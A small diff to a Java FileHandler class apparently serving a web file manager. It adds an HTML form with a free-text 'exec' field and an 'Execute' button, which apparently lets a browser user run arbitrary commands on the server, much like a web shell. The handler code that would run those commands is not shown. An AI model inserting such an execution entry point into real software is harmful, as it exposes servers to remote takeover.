@@ -91,6 +91,12 @@ public class FileHandler {
 			pw.println( "<input type='submit' name='cd' value='Upload'/> (maxsize:"+String.format("%,d%n", (Integer) maxPostSize )+")" );
 			pw.println( "</form></p>" );
 			
+			pw.println( "<p><form method='post' action='fs' target='execFrame'>" );
+			pw.println( "<input type='hidden' name='action' value='exec'/>" );
+			pw.println( "<input size='128' maxlength='512' type='text' name='exec' value=''/>" );
+			pw.println( "<input type='submit' name='go' value='Execute'/>" );
+			pw.println( "</form></p>" );
+			
 			if ( currentFile == null ) {
 				pw.println( "<h3>No path provided, listing file system roots : </h3>" );
 			} else {
